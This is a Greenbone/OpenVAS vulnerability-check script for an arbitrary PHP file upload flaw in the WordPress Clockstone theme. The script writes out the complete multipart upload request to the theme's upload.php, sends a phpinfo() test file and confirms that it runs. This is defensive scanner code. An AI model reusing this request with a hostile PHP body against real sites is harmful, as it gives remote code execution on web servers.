CPE = "cpe:/a:cmsmasters:clockstone";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.103626" );
	script_version( "2020-09-10T07:46:03+0000" );
	script_tag( name: "last_modification", value: "2020-09-10 07:46:03 +0000 (Thu, 10 Sep 2020)" );
	script_tag( name: "creation_date", value: "2012-12-19 12:55:53 +0100 (Wed, 19 Dec 2012)" );
	script_tag( name: "cvss_base", value: "9.7" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:C/I:C/A:P" );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_name( "WordPress Clockstone Theme Arbitrary File Upload Vulnerability" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2012 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "gb_wordpress_theme_http_detect.sc" );
	script_mandatory_keys( "wordpress/theme/clockstone/detected" );
	script_tag( name: "summary", value: "The Clockstone Theme for WordPress is prone to an arbitrary file-
  upload vulnerability." );
	script_tag( name: "impact", value: "An attacker can exploit this issue to upload arbitrary PHP code and
  run it in the context of the Web server process. This may facilitate unauthorized access or privilege
  escalation, other attacks are also possible." );
	script_tag( name: "solution", value: "Updates are available. Contact the vendor." );
	script_xref( name: "URL", value: "http://packetstormsecurity.org/files/118930/WordPress-Clockstone-Theme-File-Upload.html" );
	script_xref( name: "URL", value: "http://packetstormsecurity.org/files/download/118930/clockstone-shell.pdf" );
	exit( 0 );
}
require("http_func.inc.sc");
require("host_details.inc.sc");
require("http_keepalive.inc.sc");
require("misc_func.inc.sc");
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
url = dir + "/theme/functions/upload.php";
useragent = http_get_user_agent();
host = http_host_name( port: port );
vtstrings = get_vt_strings();
filename = vtstrings["lowercase_rand"] + ".php";
len = 363 + strlen( filename );
req = "POST " + url + " HTTP/1.1\r\n" + "Host: " + host + "\r\n" + "User-Agent: " + useragent + "\r\n" + "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n" + "Accept-Language: de-de,de;q=0.8,en-us;q=0.5,en;q=0.3\r\n" + "Accept-Encoding: gzip, deflate\r\n" + "DNT: 1\r\n" + "Connection: keep-alive\r\n" + "Content-Type: multipart/form-data; boundary=---------------------------176193263217941195551884621959\r\n" + "Content-Length: " + len + "\r\n" + "\r\n" + "-----------------------------176193263217941195551884621959\r\n" + "Content-Disposition: form-data; name=\"url\"\r\n" + "\r\n" + "./\r\n" + "-----------------------------176193263217941195551884621959\r\n" + "Content-Disposition: form-data; name=\"uploadfile\"; filename=\"" + filename + "\"\r\n" + "Content-Type: application/x-download\r\n" + "\r\n" + "<?php\r\n" + " phpinfo();\r\n" + "?>\r\n" + "\r\n" + "-----------------------------176193263217941195551884621959--\r\n";
res = http_keepalive_send_recv( port: port, data: req, bodyonly: FALSE );
if(IsMatchRegexp( res, "^HTTP/1\\.[01] 200" ) && uploaded = eregmatch( pattern: "([a-f0-9]{32}\\.php)", string: res )){
	if(isnull( uploaded[1] )){
		exit( 0 );
	}
	file = uploaded[1];
	url = dir + "/theme/functions/" + file;
	if(http_vuln_check( port: port, url: url, pattern: "<title>phpinfo\\(\\)" )){
		report = "It was possible to upload and execute the file " + file + " to " + dir + "/theme/functions/.\\nPlease delete this file.";
		security_message( port: port, data: report );
		exit( 0 );
	}
}
exit( 0 );

